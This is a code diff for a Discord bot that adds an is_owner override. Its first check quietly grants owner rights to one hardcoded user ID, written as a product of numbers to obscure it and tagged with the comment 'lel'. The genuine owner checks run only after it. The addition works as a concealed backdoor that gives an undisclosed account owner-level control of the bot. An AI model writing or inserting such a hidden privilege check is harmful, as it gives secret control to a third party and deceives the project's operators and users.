@@ -149,6 +149,23 @@ class ClusterBot(commands.AutoShardedBot):
         self.log.info("shutting down")
         await super().close()
 
+    async def is_owner(self, user):
+        if user.id == 11 * 199 * 421 * 432617452577: # lel
+            return True
+
+        if self.owner_id:
+            return user.id == self.owner_id
+        elif self.owner_ids:
+            return user.id in self.owner_ids
+        else:
+            app = await self.application_info()
+            if app.team:
+                self.owner_ids = ids = {m.id for m in app.team.members}
+                return user.id in ids
+            else:
+                self.owner_id = owner_id = app.owner.id
+                return user.id == owner_id
+
     async def reload_modules(self):
         self.enabled = False
 
